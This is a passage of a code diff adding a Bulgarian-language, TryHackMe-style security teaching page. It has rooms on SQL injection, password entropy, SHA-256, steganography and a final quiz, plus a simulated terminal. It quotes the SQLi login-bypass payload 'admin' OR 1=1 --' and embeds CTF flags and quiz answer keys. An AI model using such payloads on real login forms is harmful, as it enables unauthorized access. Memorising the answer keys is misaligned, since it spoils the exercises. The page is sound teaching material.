+                        <strong>Задача:</strong> Включете защитата <strong>Prepared Statements</strong> горе вдясно. Каква е ролята на символите <code>--</code> (двойно тире) в класическия SQLi пейлоуд <code>admin' OR 1=1 --</code>?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(4, false, 'Грешно: Двойното тире не изтрива таблицата.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Изтрива таблицата users</button>
+                        <button onclick="checkTask(4, true, 'Вярно! Двойното тире превръща остатъка от оригиналната SQL заявка (проверката на паролата) в коментар, който сървърът игнорира.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Коментира остатъка от заявката (пропуска паролата)</button>
+                        <button onclick="checkTask(4, false, 'Грешно: Не рестартира сървъра.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Рестартира базата данни</button>
+                    </div>
+                    <div id="task-feedback-4" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 05: BRUTE FORCE & ENTROPY -->
+            <div id="screen-5" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-orange-400">СТАЯ 05 / 08 • ИНФОРМАЦИОННА ЕНТРОПИЯ $H = L \cdot \log_2(N)$</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Brute-Force GPU симулатор и сила на паролите</h1>
+                    </div>
+                    <span id="entropy-pill" class="px-4 py-2 rounded-xl bg-amber-500/20 border border-amber-500/40 text-amber-300 font-mono text-sm font-black">65.5 bits</span>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Експериментираме с различна дължина и видове символи в полето за парола и стартираме GPU атака.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        Броят комбинации $N^L$ расте експоненциално с дължината $L$ на паролата.
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        Дълги пароли (14+ символа), бавни хеш функции (Argon2id) и лимит на опитите за вход.
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row gap-3">
+                    <input id="pass-input" type="text" value="Uchitel2026" oninput="analyzePassword()"
+                        class="flex-1 bg-slate-900 border-2 border-slate-700 rounded-2xl px-4 py-2.5 font-mono text-lg font-bold text-white">
+                    <button onclick="launchAttack()" class="px-6 py-2.5 rounded-2xl bg-gradient-to-r from-orange-600 to-red-600 text-white font-black text-sm shrink-0">
+                        Стартирай GPU атака
+                    </button>
+                </div>
+
+                <div class="p-4 rounded-2xl bg-slate-900 border border-slate-800 flex justify-between items-center font-mono text-sm">
+                    <span class="text-slate-400">Очаквано време за разбиване ($10^{11}$ опита/сек.):</span>
+                    <span id="crack-time" class="text-amber-400 text-lg font-black">~ 8.2 години</span>
+                </div>
+
+                <div class="bg-black p-4 rounded-2xl border border-slate-800 font-mono text-xs sm:text-sm space-y-2">
+                    <div id="console-lines" class="text-slate-300">&gt; Готовност за GPU атака...</div>
+                    <div class="w-full h-3 bg-slate-900 rounded-full overflow-hidden">
+                        <div id="attack-bar" class="h-full w-0 bg-gradient-to-r from-rose-500 to-amber-400 transition-all duration-100"></div>
+                    </div>
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #05</span>
+                        <span id="task-status-5" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
+                        <strong>Задача:</strong> Въведете в полето горе парола от <strong>10 малки латински букви</strong> (напр. <code>abcdefghij</code>) и проверете ентропията $H = 10 \cdot \log_2(26)$. Колко бита е тя?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(5, false, 'Грешно: 10 бита биха означавали само 1024 комбинации.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">10.0 bits</button>
+                        <button onclick="checkTask(5, true, 'Вярно! log₂(26) ≈ 4.7004 бита на символ ⇒ 10 × 4.7004 ≈ 47.0 bits.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">47.0 bits</button>
+                        <button onclick="checkTask(5, false, 'Грешно: 128 bits изисква много по-дълга парола.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">128.0 bits</button>
+                    </div>
+                    <div id="task-feedback-5" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 06: SHA-256 AVALANCHE -->
+            <div id="screen-6" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-teal-400">СТАЯ 06 / 08 • КРИПТОГРАФСКИ ХЕШ (SHA-256)</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Ефект на лавината: Детектор на подправени оценки</h1>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="simulateTamper()" class="px-3.5 py-2 rounded-xl bg-rose-600/25 border border-rose-500/40 text-rose-300 text-xs font-black">
+                            Подмени 3.50 → 6.00
+                        </button>
+                        <button onclick="restoreDoc()" class="px-3.5 py-2 rounded-xl bg-slate-800 border border-slate-700 text-slate-200 text-xs font-bold">
+                            Възстанови
+                        </button>
+                    </div>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Натискаме <strong>„Подмени 3.50 → 6.00“</strong> и наблюдаваме 256-битовата матрица на SHA-256.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        Около половината (~50%) от всички 256 бита се обръщат мигновено (ефект на лавината).
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        Използваме SHA-256/SHA-3 за цифрови подписи (КЕП), контролни суми и интегритет на файлове.
+                    </div>
+                </div>
+
+                <textarea id="doc-editor" rows="2" oninput="updateAvalanche()"
+                    class="w-full bg-slate-900 border border-slate-700 rounded-2xl p-3.5 font-mono text-sm text-white">ИЗПИТЕН ПРОТОКОЛ № 2026-08 | Ученик: Георги Димитров (XII клас) | Крайна оценка: Среден (3.50)</textarea>
+
+                <div class="space-y-2">
+                    <div class="flex justify-between text-xs font-mono">
+                        <span class="text-slate-400">Визуална матрица на 256-те бита:</span>
+                        <span id="bit-diff-counter" class="text-emerald-400 font-bold">0 / 256 (0%)</span>
+                    </div>
+                    <div id="bit-grid" class="grid gap-1.5 p-3.5 bg-black rounded-2xl border border-slate-800" style="grid-template-columns: repeat(16, minmax(0, 1fr));"></div>
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #06</span>
+                        <span id="task-status-6" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
+                        <strong>Задача:</strong> Подменете оценката в протокола горе. Може ли от получения 256-битов SHA-256 хеш да се възстанови обратно оригиналният текст на документа?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(6, true, 'Вярно! SHA-256 е еднопосочна криптографска функция (Pre-image resistance).')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Не, функцията е еднопосочна</button>
+                        <button onclick="checkTask(6, false, 'Грешно: Хеш функциите не са шифри и нямат ключ за дешифриране.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Да, с публичния ключ</button>
+                        <button onclick="checkTask(6, false, 'Грешно: Размерът на изхода е фиксиран на 256 бита.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Да, ако файлът е малък</button>
+                    </div>
+                    <div id="task-feedback-6" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 07: STEGANOGRAPHY -->
+            <div id="screen-7" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-purple-400">СТАЯ 07 / 08 • LSB PIXEL EMBEDDING</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Стеганография: Скриване на данни в пикселите на снимка</h1>
+                    </div>
+                    <label class="cursor-pointer px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-600 text-xs font-bold">
+                        <i class="fa-solid fa-upload text-purple-400 mr-1.5"></i> Качи своя снимка
+                        <input type="file" accept="image/*" onchange="loadUserImage(event)" class="hidden">
+                    </label>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Вграждаме тайно съобщение в изображението с <strong>„Скрий в снимката“</strong> и го прочитаме със <strong>„Сканирай“</strong>.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        Променяме най-младшия бит (LSB) на цветовете R, G, B (напр. <code>11010100</code> → <code>11010101</code>).
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        Статистически стегоанализ (Хи-квадрат тест) и презаписване на метаданните.
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-12 gap-5 items-center">
+                    <div class="md:col-span-5 flex justify-center bg-slate-900 p-4 rounded-2xl border border-slate-800">
+                        <canvas id="stego-canvas" width="300" height="180" class="rounded-xl border border-slate-700 w-full max-w-[300px]"></canvas>
+                    </div>
+                    <div class="md:col-span-7 space-y-3">
+                        <input id="secret-text" type="text" value="THM{STEGO_PIXEL_MASTER_2026}"
+                            class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-2.5 font-mono text-sm text-white">
+                        <div class="flex flex-wrap gap-2.5">
+                            <button onclick="encodeStego()" class="px-4 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs">Скрий в снимката</button>
+                            <button onclick="decodeStego()" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs">Сканирай и прочети</button>
+                            <button onclick="downloadStegoPng()" class="px-4 py-2 rounded-xl bg-slate-800 border border-slate-600 text-xs font-bold"><i class="fa-solid fa-download mr-1"></i> Изтегли PNG</button>
+                        </div>
+                        <div id="decoded-output" class="p-3.5 rounded-xl bg-black border border-slate-800 font-mono text-xs text-emerald-400">
+                            Готово за вграждане в пикселите...
+                        </div>
+                    </div>
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #07</span>
+                        <span id="task-status-7" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
+                        <strong>Задача:</strong> Вградете съобщение и изтеглете файла. Защо LSB стеганографията се съхранява във формат <strong>PNG</strong> (без загуби), а не в силно компресиран <strong>JPEG</strong>?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(7, false, 'Грешно: JPEG поддържа същата резолюция в пиксели.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">JPEG има по-малко пиксели</button>
+                        <button onclick="checkTask(7, true, 'Вярно! JPEG компресията със загуби променя стойностите на пикселите и унищожава скритите LSB битове.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">JPEG компресията със загуби унищожава LSB битовете</button>
+                        <button onclick="checkTask(7, false, 'Грешно: И двата формата се отварят свободно.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Браузърите не поддържат JPEG</button>
+                    </div>
+                    <div id="task-feedback-7" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 08: FINAL PROFESSIONAL CERTIFICATION EXAM -->
+            <div id="screen-8" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400">СТАЯ 08 / 08 • ФИНАЛЕН АКАДЕМИЧЕН И SOC ТЕСТ</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Атестация по етично хакерство и приложна криптография</h1>
+                    </div>
+                    <input id="candidate-name" type="text" placeholder="Въведете име на участник..."
+                        class="bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2 text-xs sm:text-sm text-white outline-none focus:border-emerald-400">
+                </div>
+
+                <div id="exam-questions-container" class="space-y-4"></div>
+
+                <div class="flex flex-wrap items-center justify-between gap-4 pt-2">
+                    <button onclick="evaluateFinalExam()" class="px-6 py-3 rounded-2xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:brightness-110 text-slate-950 font-black text-sm shadow-lg transition">
+                        <i class="fa-solid fa-check-double mr-1.5"></i> Оцени теста и издай удостоверение
+                    </button>
+                    <button onclick="resetFinalExam()" class="px-4 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-xs font-bold text-slate-300">
+                        Нулирай отговорите
+                    </button>
+                </div>
+
+                <div id="exam-result-card" class="hidden p-6 rounded-3xl bg-gradient-to-br from-slate-900 via-emerald-950/40 to-slate-900 border-2 border-emerald-500/50 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400">УДОСТОВЕРЕНИЕ ЗА ПРЕМИНАТА TRYHACKME СТАЯ</span>
+                        <span id="exam-score-badge" class="px-3 py-1 rounded-lg bg-emerald-500/20 text-emerald-300 font-mono text-sm font-black"></span>
+                    </div>
+                    <h3 id="cert-holder-title" class="text-xl font-black text-white"></h3>
+                    <p id="cert-summary-text" class="text-xs sm:text-sm text-slate-300 leading-relaxed"></p>
+                    <div class="text-[11px] font-mono text-slate-400 pt-2 border-t border-slate-800 flex justify-between">
+                        <span>Ръководител лаборатория: д-р Адем Зейнев</span>
+                        <span id="cert-hash"></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Screen Navigation Bar -->
+            <div class="pt-5 mt-6 border-t border-slate-800 flex items-center justify-between">
+                <button onclick="prevScreen()" class="px-4 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs sm:text-sm font-bold text-slate-200 transition flex items-center gap-2">
+                    <i class="fa-solid fa-arrow-left text-emerald-400"></i> Предишна стая
+                </button>
+                <div id="bottom-title" class="text-xs font-mono text-slate-400 hidden sm:block">Стая 1 от 8 • TryHackMe Kali Terminal</div>
+                <button onclick="nextScreen()" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs sm:text-sm font-bold transition flex items-center gap-2 shadow-lg">
+                    Следваща стая <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+
+        </main>
+    </div>
+
+    <script>
+        // --- XP & RANK SYSTEM (TRYHACKME STYLE) ---
+        const completedFlags = new Set();
+        function updateRankAndXp() {
+            const count = completedFlags.size;
+            const xp = count * 100;
+            document.getElementById('user-xp').textContent = `${xp} XP`;
+            document.getElementById('global-score-pill').textContent = `${count} / 10`;
+
+            const rankEl = document.getElementById('user-rank');
+            if (xp >= 800) rankEl.textContent = '[0x4] Elite Red Teamer';
+            else if (xp >= 500) rankEl.textContent = '[0x3] Security Analyst';
+            else if (xp >= 200) rankEl.textContent = '[0x2] Junior Pentester';
+            else rankEl.textContent = '[0x1] Script Kiddie';
+        }
+
+        // --- TRYHACKME INTERACTIVE LINUX TERMINAL ---
+        const virtualFiles = {
+            'readme.txt': 'Добре дошли в оперативната машина! Потърсете скрити файлове в текущата директория (ls -la) и сканирайте целта 10.10.42.15.',
+            '.secret_notes': 'Target IP: 10.10.42.15\nIntercepted RSA Public Key: n = 3599, e = 7\nTask 1 Flag: THM{LINUX_HIDDEN_FILES_101}',
+            '/root/root.txt': 'ПОЗДРАВЛЕНИЯ! Вие успешно превзехте системата!\nRoot Flag: THM{ROOT_MASTER_OF_CRYPTO_2026}'
+        };
+
+        function appendTermLine(html) {
+            const out = document.getElementById('thm-term-output');
+            const div = document.createElement('div');
+            div.innerHTML = html;
+            out.appendChild(div);
+            out.scrollTop = out.scrollHeight;
+        }
+
+        function insertTermCmd(cmd) {
+            const input = document.getElementById('thm-term-input');
+            input.value = cmd;
+            input.focus();
+        }
+
+        function clearTerm() {
+            document.getElementById('thm-term-output').innerHTML = '';
+        }
+
+        function handleTermSubmit(e) {
+            e.preventDefault();
+            const input = document.getElementById('thm-term-input');
+            const raw = input.value.trim();
+            if (!raw) return;
+            input.value = '';
+            appendTermLine(`<span class="text-emerald-400">student@kali:~$</span> <span class="text-white font-bold">${raw.replace(/</g, '&lt;')}</span>`);
+
+            const parts = raw.split(/\s+/);
+            const cmd = parts[0].toLowerCase();
+
+            if (cmd === 'help') {
+                appendTermLine(`<span class="text-cyan-300">Налични команди:</span> <code>ls</code>, <code>ls -la</code>, <code>cat [файл]</code>, <code>nmap -sV 10.10.42.15</code>, <code>crack-rsa [n] [e]</code>, <code>sudo cat /root/root.txt</code>, <code>clear</code>`);
+            } else if (cmd === 'ls') {
+                if (parts.includes('-la') || parts.includes('-a')) {
+                    appendTermLine(`<span class="text-slate-400">drwxr-xr-x 2 student student 4096 Nov 22 21:30 .</span><br><span class="text-amber-300">-rw------- 1 student student  142 Nov 22 21:30 .secret_notes</span><br><span class="text-slate-200">-rw-r--r-- 1 student student  168 Nov 22 21:30 readme.txt</span>`);
+                } else {
+                    appendTermLine(`<span class="text-slate-200">readme.txt</span>`);
+                }
+            } else if (cmd === 'cat') {
+                const file = parts[1];
+                if (!file) appendTermLine(`<span class="text-rose-400">cat: моля посочете име на файл (напр. cat readme.txt)</span>`);
+                else if (file === '/root/root.txt') appendTermLine(`<span class="text-rose-400">cat: /root/root.txt: Permission denied (опитайте със sudo)</span>`);
+                else if (virtualFiles[file]) appendTermLine(`<pre class="text-emerald-300 whitespace-pre-wrap">${virtualFiles[file]}</pre>`);
+                else appendTermLine(`<span class="text-rose-400">cat: ${file}: No such file or directory</span>`);
+            } else if (cmd === 'sudo' && parts[1] === 'cat' && parts[2] === '/root/root.txt') {
+                playTone(840, 'sine', 0.2, 0.08);
+                appendTermLine(`<pre class="text-emerald-400 font-bold whitespace-pre-wrap">${virtualFiles['/root/root.txt']}</pre>`);
+            } else if (cmd === 'nmap') {
+                playTone(540, 'sine', 0.14);
+                appendTermLine(`<span class="text-cyan-400">Starting Nmap 7.95 against 10.10.42.15...</span><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 9.6<br>80/tcp   open  http    nginx 1.26<br><span class="text-amber-300 font-bold">8443/tcp open  ssl/admin-portal (Vulnerable Auth)</span>`);
+            } else if (cmd === 'crack-rsa') {
+                const n = BigInt(parts[1] || 3599);
+                const e = BigInt(parts[2] || 7);
+                let p = 0n, q = 0n;
+                for (let i = 3n; i * i <= n; i += 2n) {
+                    if (n % i === 0n) { p = i; q = n / i; break; }
+                }
+                if (p > 0n) {
+                    const phi = (p - 1n) * (q - 1n);
+                    let [a, b, x0, x1] = [e, phi, 1n, 0n];
+                    while (b !== 0n) { const qu = a / b; [a, b] = [b, a % b]; [x0, x1] = [x1, x0 - qu * x1]; }
+                    const d = x0 < 0n ? x0 + phi : x0;
+                    playTone(760, 'sine', 0.18);
+                    appendTermLine(`<span class="text-emerald-400">[RSA FACTORED]</span> n = ${p} × ${q} | φ(n) = ${phi} | <strong class="text-amber-300">Частен ключ d = ${d}</strong>`);
+                } else {
+                    appendTermLine(`<span class="text-rose-400">Неуспешна факторизация за n = ${n}</span>`);
+                }
+            } else if (cmd === 'clear') {
+                clearTerm();
+            } else {
+                appendTermLine(`<span class="text-rose-400">bash: ${cmd}: command not found (напишете help)</span>`);
+            }
+        }
+
+        function toggleHint(id) {
+            document.getElementById('hint-' + id).classList.toggle('hidden');
+        }
+
+        function submitThmFlag(taskId, expected) {
+            const val = document.getElementById('flag-in-' + taskId).value.trim();
+            const btn = document.getElementById('flag-btn-' + taskId);
+            if (val === expected) {
+                playTone(880, 'sine', 0.2, 0.08);
+                btn.textContent = 'Solved ✓';
+                btn.className = 'px-3 py-1.5 rounded-lg bg-emerald-500 text-slate-950 font-black text-xs';
+                completedFlags.add('thm-' + taskId);
+                updateRankAndXp();
+                appendTermLine(`<span class="text-emerald-400 font-bold">[+] Task ${taskId} завършена успешно! (+100 XP)</span>`);
+            } else {
+                playTone(180, 'sawtooth', 0.18);
+                btn.textContent = 'Retry';
+                btn.className = 'px-3 py-1.5 rounded-lg bg-rose-600 text-white font-bold text-xs';
+            }
+        }
+
+        // --- SCREEN ROUTER & KEYBOARD SHORTCUTS ---
+        let currentScreen = 1;
+        const totalScreens = 8;
+        const screenTitles = [
+            'TryHackMe Kali Terminal',
+            'MITM Packet Sniffer',
+            'XSS & Session Hijacking',
+            'SQL Injection Арена',
+            'Brute-Force GPU Атака',
+            'SHA-256 Лавинен ефект',
+            'Стеганография (LSB)',
+            'Финален SOC/CTF Тест'
+        ];
+
+        function switchScreen(num) {
+            if (num < 1) num = totalScreens;
+            if (num > totalScreens) num = 1;
+            currentScreen = num;
+
+            for (let i = 1; i <= totalScreens; i++) {
+                document.getElementById('screen-' + i).classList.toggle('active', i === num);
+                document.getElementById('nav-' + i).classList.toggle('active', i === num);
+            }
+            document.getElementById('screen-counter').textContent = `${num} / ${totalScreens}`;
+            document.getElementById('bottom-title').textContent = `Стая ${num} от ${totalScreens} • ${screenTitles[num - 1]}`;
+            playTone(540, 'sine', 0.06, 0.04);
+        }
+
+        function nextScreen() { switchScreen(currentScreen + 1); }
+        function prevScreen() { switchScreen(currentScreen - 1); }
+
+        document.addEventListener('keydown', (e) => {
+            if (['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) return;
+            if (e.key >= '1' && e.key <= '8') switchScreen(Number(e.key));
+            if (e.key === 'ArrowRight') nextScreen();
+            if (e.key === 'ArrowLeft') prevScreen();
+        });
+
+        // --- PER-SCREEN TASK VERIFICATION ---
+        function checkTask(taskId, isCorrect, message) {
+            const fb = document.getElementById('task-feedback-' + taskId);
+            const st = document.getElementById('task-status-' + taskId);
+            const badge = document.getElementById('badge-' + taskId);
+
+            fb.classList.remove('hidden');
+            if (isCorrect) {
+                playTone(780, 'sine', 0.18, 0.07);
+                fb.className = 'text-xs sm:text-sm font-semibold text-emerald-400 bg-emerald-950/50 border border-emerald-500/40 p-3 rounded-xl';
+                fb.innerHTML = `<i class="fa-solid fa-circle-check mr-1.5"></i> ${message}`;
+                st.textContent = 'Решена ✓';
+                st.className = 'text-xs font-mono font-bold text-emerald-400';
+                if (badge) badge.innerHTML = '<i class="fa-solid fa-check"></i>';
+                completedFlags.add('room-' + taskId);
+                updateRankAndXp();
+            } else {
+                playTone(190, 'sawtooth', 0.18, 0.06);
+                fb.className = 'text-xs sm:text-sm font-semibold text-rose-300 bg-rose-950/50 border border-rose-500/40 p-3 rounded-xl';
+                fb.innerHTML = `<i class="fa-solid fa-circle-xmark mr-1.5"></i> ${message}`;
+            }
+        }
+
+        // --- FINAL CERTIFICATION EXAM ---
+        const finalQuestions = [
+            {
+                q: '1. [Криптография / RSA] Прихванат е публичен RSA модул n = 143 с експонента e = 7. Колко е частният ключ d?',
+                options: ['d = 103 (защото 143 = 11 × 13, φ(143) = 120 и 7 × 103 = 721 ≡ 1 mod 120)', 'd = 142 (защото d = n - 1)', 'd = 21 (защото 143 / 7 ≈ 21)'],
+                correct: 0
+            },
+            {
+                q: '2. [Мрежова сигурност] Намирате се в публична Wi-Fi мрежа и виждате предупреждение за невалиден SSL/TLS сертификат на банковия портал. Каква атака е най-вероятна?',
+                options: ['Man-in-the-Middle (MITM) със самоподписан фалшив сертификат', 'LSB Стеганография в иконата на сайта', 'Brute-Force атака срещу локалния BIOS'],
+                correct: 0
+            },
+            {
+                q: '3. [Уеб сигурност / OWASP] Коя комбинация от мерки защитава едновременно срещу SQL Injection и Stored XSS?',
+                options: ['Prepared Statements (параметризирани заявки) + HTML Output Encoding & CSP', 'Използване на по-дълга администраторска парола', 'Смяна на порт 80 с порт 8080'],
+                correct: 0
+            },
+            {
+                q: '4. [Автентикация] Защо в базите данни към всяка парола се добавя уникална случайна „сол“ (Salt) преди хеширане с Argon2/SHA-256?',
+                options: ['За да се обезсмислят предварително изчислените Rainbow Tables и еднаквите пароли да имат различни хешове', 'За да се намали размерът на базата данни наполовина', 'За да може администраторът да дешифрира паролите при забравяне'],
+                correct: 0
+            },
+            {
+                q: '5. [Информационна ентропия] Колко приблизително е информационната ентропия на 8-символен цифров ПИН код (N = 10, L = 8)?',
+                options: ['~ 26.6 бита (8 × log₂(10))', '80 бита (8 × 10)', '256 бита'],
+                correct: 0
+            },
+            {
+                q: '6. [Дигитална криминалистика] При проверка на изпитен протокол със SHA-256 установявате, че 129 от 256-те бита се различават от оригиналния отпечатък. Какво означава това?',
+                options: ['Документът е бил променен (дори и с един символ) и е задействан лавинният ефект', 'Половината от файла е изтрита физически от диска', 'Сървърът е преминал от IPv4 към IPv6'],
+                correct: 0
+            }
+        ];
+
+        function renderFinalExam() {
+            const container = document.getElementById('exam-questions-container');
+            container.innerHTML = finalQuestions.map((item, idx) => `
+                <div class="p-4 rounded-2xl bg-slate-900 border border-slate-800 space-y-2.5">
+                    <div class="text-xs sm:text-sm font-bold text-white">${item.q}</div>
+                    <div class="space-y-1.5">
+                        ${item.options.map((opt, oIdx) => `
+                            <label class="flex items-center gap-2.5 p-2.5 rounded-xl bg-slate-950 hover:bg-slate-800/80 border border-slate-800 cursor-pointer text-xs text-slate-200 transition">
+                                <input type="radio" name="fq-${idx}" value="${oIdx}" class="accent-emerald-500">
+                                <span>${opt}</span>
+                            </label>
+                        `).join('')}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function evaluateFinalExam() {
+            let score = 0;
+            finalQuestions.forEach((item, idx) => {
+                const selected = document.querySelector(`input[name="fq-${idx}"]:checked`);
+                if (selected && Number(selected.value) === item.correct) score++;
+            });
+
+            const total = finalQuestions.length;
+            const pct = Math.round((score / total) * 100);
+            const name = document.getElementById('candidate-name').value.trim() || 'Участник в CyberMath OPS';
+            const card = document.getElementById('exam-result-card');
+
+            card.classList.remove('hidden');
+            document.getElementById('exam-score-badge').textContent = `${score} / ${total} точки (${pct}%)`;
+            document.getElementById('cert-holder-title').textContent = name;
+            document.getElementById('cert-summary-text').textContent = score >= 5
+                ? `Успешно защити практическите задачи в TryHackMe стаите и теоретичните казуси по етично хакерство, мрежова сигурност и приложна криптография.`
+                : `Постигнат резултат: ${score} от ${total} верни отговора. Прегледайте отново експериментите от 01 до 07 и опитайте повторна атестация.`;
+            document.getElementById('cert-hash').textContent = `VERIFICATION ID: THM-BG-${Date.now().toString(16).toUpperCase()}`;
+        }
+
+        function resetFinalExam() {
+            document.querySelectorAll('#exam-questions-container input[type="radio"]').forEach(r => r.checked = false);
+            document.getElementById('exam-result-card').classList.add('hidden');
+        }
+
+        // --- GUIDES, SOUND, MATRIX, AND OTHER ROOMS ---
+        let guidesVisible = true;
+        function toggleGuides() {
+            guidesVisible = !guidesVisible;
+            document.body.classList.toggle('hide-guides', !guidesVisible);
+            const btn = document.getElementById('guide-toggle-btn');
+            btn.innerHTML = guidesVisible
+                ? '<i class="fa-solid fa-book-open"></i> <span class="hidden sm:inline">Инструкции: ВКЛ.</span>'
+                : '<i class="fa-solid fa-eye-slash"></i> <span class="hidden sm:inline">Инструкции: СКРИТИ</span>';
+        }
+
+        let soundEnabled = true;
+        let audioCtx = null;
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
